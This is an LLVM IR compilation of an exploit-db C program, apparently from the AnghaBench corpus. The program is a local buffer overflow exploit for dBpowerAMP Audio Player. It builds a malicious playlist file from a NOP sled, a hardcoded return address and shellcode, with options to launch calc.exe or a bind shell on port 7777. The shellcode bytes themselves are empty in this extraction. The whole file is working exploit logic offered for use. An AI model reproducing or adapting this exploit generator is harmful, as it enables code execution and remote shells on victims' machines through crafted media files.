; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_7994.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_7994.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [66 x i8] c"################################################################\0A\00", align 1
@.str.1 = private unnamed_addr constant [56 x i8] c" dBpowerAMP Audio Player local buffer overflow exploit\0A\00", align 1
@.str.2 = private unnamed_addr constant [21 x i8] c"\09Coded By SimO-s0fT\0A\00", align 1
@.str.3 = private unnamed_addr constant [39 x i8] c"e-mail : simo[at]exploiter-ma[dot]com\0A\00", align 1
@.str.4 = private unnamed_addr constant [29 x i8] c"USAGE : simo36.exe simo.pls\0A\00", align 1
@.str.5 = private unnamed_addr constant [22 x i8] c"[1] execute calc.exe\0A\00", align 1
@.str.6 = private unnamed_addr constant [34 x i8] c"[2] execute bindshell LPORT=7777\0A\00", align 1
@.str.7 = private unnamed_addr constant [9 x i8] c"color 04\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"enter\00", align 1
@.str.9 = private unnamed_addr constant [3 x i8] c"%d\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.11 = private unnamed_addr constant [23 x i8] c"cannot opening file xD\00", align 1
@OFFSET = common dso_local global i32 0, align 4
@scode1 = common dso_local global i32* null, align 8
@header = common dso_local global i8* null, align 8
@.str.12 = private unnamed_addr constant [34 x i8] c"created !!\0Aopenit with dBpowerAMP\00", align 1
@scode2 = common dso_local global i32* null, align 8
@.str.13 = private unnamed_addr constant [35 x i8] c"created !!\0A openit with dBpowerAMP\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 2089145704, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 0, i32* %10, align 4
  %11 = call i32 @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str, i64 0, i64 0))
  %12 = call i32 @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.1, i64 0, i64 0))
  %13 = call i32 @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0))
  %14 = call i32 @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.3, i64 0, i64 0))
  %15 = call i32 @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str, i64 0, i64 0))
  %16 = call i32 @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.4, i64 0, i64 0))
  %17 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.5, i64 0, i64 0))
  %18 = call i32 @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.6, i64 0, i64 0))
  %19 = call i32 @printf(i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str, i64 0, i64 0))
  %20 = call i32 @system(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0))
  %21 = call i32 @sleep(i32 2000)
  %22 = call i32 @printf(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i64 0, i64 0))
  %23 = call i32 @scanf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0), i32* %10)
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 1
  %26 = load i8*, i8** %25, align 8
  %27 = call i32* @fopen(i8* %26, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i64 0, i64 0))
  store i32* %27, i32** %6, align 8
  %28 = icmp eq i32* %27, null
  br i1 %28, label %29, label %32

29:                                               ; preds = %2
  %30 = call i32 @perror(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.11, i64 0, i64 0))
  %31 = call i32 @exit(i32 0) #3
  unreachable

32:                                               ; preds = %2
  %33 = load i32, i32* %10, align 4
  switch i32 %33, label %142 [
    i32 1, label %34
    i32 2, label %88
  ]

34:                                               ; preds = %32
  %35 = load i32, i32* @OFFSET, align 4
  %36 = zext i32 %35 to i64
  %37 = add i64 %36, 4
  %38 = load i32*, i32** @scode1, align 8
  %39 = call i32 @strlen(i32* %38)
  %40 = zext i32 %39 to i64
  %41 = add i64 %37, %40
  %42 = trunc i64 %41 to i32
  %43 = call i64 @malloc(i32 %42)
  %44 = inttoptr i64 %43 to i8*
  store i8* %44, i8** %7, align 8
  %45 = load i8*, i8** %7, align 8
  %46 = load i32, i32* @OFFSET, align 4
  %47 = zext i32 %46 to i64
  %48 = add i64 %47, 4
  %49 = load i32*, i32** @scode1, align 8
  %50 = call i32 @strlen(i32* %49)
  %51 = zext i32 %50 to i64
  %52 = add i64 %48, %51
  %53 = trunc i64 %52 to i32
  %54 = call i32 @memset(i8* %45, i32 144, i32 %53)
  %55 = load i32, i32* @OFFSET, align 4
  store i32 %55, i32* %9, align 4
  %56 = load i8*, i8** %7, align 8
  %57 = load i32, i32* %9, align 4
  %58 = zext i32 %57 to i64
  %59 = getelementptr inbounds i8, i8* %56, i64 %58
  %60 = ptrtoint i8* %59 to i32
  %61 = call i32 @memcpy(i32 %60, i32* %8, i32 3)
  %62 = load i32, i32* %9, align 4
  %63 = zext i32 %62 to i64
  %64 = add i64 %63, 4
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %9, align 4
  %66 = load i8*, i8** %7, align 8
  %67 = load i32, i32* %9, align 4
  %68 = zext i32 %67 to i64
  %69 = getelementptr inbounds i8, i8* %66, i64 %68
  %70 = ptrtoint i8* %69 to i32
  %71 = load i32*, i32** @scode1, align 8
  %72 = load i32*, i32** @scode1, align 8
  %73 = call i32 @strlen(i32* %72)
  %74 = call i32 @memcpy(i32 %70, i32* %71, i32 %73)
  %75 = load i32*, i32** @scode1, align 8
  %76 = call i32 @strlen(i32* %75)
  %77 = load i32, i32* %9, align 4
  %78 = add i32 %77, %76
  store i32 %78, i32* %9, align 4
  %79 = load i8*, i8** @header, align 8
  %80 = load i32*, i32** %6, align 8
  %81 = call i32 @fputs(i8* %79, i32* %80)
  %82 = load i8*, i8** %7, align 8
  %83 = load i32*, i32** %6, align 8
  %84 = call i32 @fputs(i8* %82, i32* %83)
  %85 = load i32*, i32** %6, align 8
  %86 = call i32 @fclose(i32* %85)
  %87 = call i32 @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.12, i64 0, i64 0))
  br label %142

88:                                               ; preds = %32
  %89 = load i32, i32* @OFFSET, align 4
  %90 = zext i32 %89 to i64
  %91 = add i64 %90, 4
  %92 = load i32*, i32** @scode2, align 8
  %93 = call i32 @strlen(i32* %92)
  %94 = zext i32 %93 to i64
  %95 = add i64 %91, %94
  %96 = trunc i64 %95 to i32
  %97 = call i64 @malloc(i32 %96)
  %98 = inttoptr i64 %97 to i8*
  store i8* %98, i8** %7, align 8
  %99 = load i8*, i8** %7, align 8
  %100 = load i32, i32* @OFFSET, align 4
  %101 = zext i32 %100 to i64
  %102 = add i64 %101, 4
  %103 = load i32*, i32** @scode2, align 8
  %104 = call i32 @strlen(i32* %103)
  %105 = zext i32 %104 to i64
  %106 = add i64 %102, %105
  %107 = trunc i64 %106 to i32
  %108 = call i32 @memset(i8* %99, i32 144, i32 %107)
  %109 = load i32, i32* @OFFSET, align 4
  store i32 %109, i32* %9, align 4
  %110 = load i8*, i8** %7, align 8
  %111 = load i32, i32* %9, align 4
  %112 = zext i32 %111 to i64
  %113 = getelementptr inbounds i8, i8* %110, i64 %112
  %114 = ptrtoint i8* %113 to i32
  %115 = call i32 @memcpy(i32 %114, i32* %8, i32 4)
  %116 = load i32, i32* %9, align 4
  %117 = zext i32 %116 to i64
  %118 = add i64 %117, 4
  %119 = trunc i64 %118 to i32
  store i32 %119, i32* %9, align 4
  %120 = load i8*, i8** %7, align 8
  %121 = load i32, i32* %9, align 4
  %122 = zext i32 %121 to i64
  %123 = getelementptr inbounds i8, i8* %120, i64 %122
  %124 = ptrtoint i8* %123 to i32
  %125 = load i32*, i32** @scode2, align 8
  %126 = load i32*, i32** @scode2, align 8
  %127 = call i32 @strlen(i32* %126)
  %128 = call i32 @memcpy(i32 %124, i32* %125, i32 %127)
  %129 = load i32*, i32** @scode2, align 8
  %130 = call i32 @strlen(i32* %129)
  %131 = load i32, i32* %9, align 4
  %132 = add i32 %131, %130
  store i32 %132, i32* %9, align 4
  %133 = load i8*, i8** @header, align 8
  %134 = load i32*, i32** %6, align 8
  %135 = call i32 @fputs(i8* %133, i32* %134)
  %136 = load i8*, i8** %7, align 8
  %137 = load i32*, i32** %6, align 8
  %138 = call i32 @fputs(i8* %136, i32* %137)
  %139 = load i32*, i32** %6, align 8
  %140 = call i32 @fclose(i32* %139)
  %141 = call i32 @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.13, i64 0, i64 0))
  br label %142

142:                                              ; preds = %32, %88, %34
  %143 = load i8*, i8** %7, align 8
  %144 = call i32 @free(i8* %143)
  ret i32 0
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @scanf(i8*, i32*) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @perror(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @memcpy(i32, i32*, i32) #1

declare dso_local i32 @fputs(i8*, i32*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
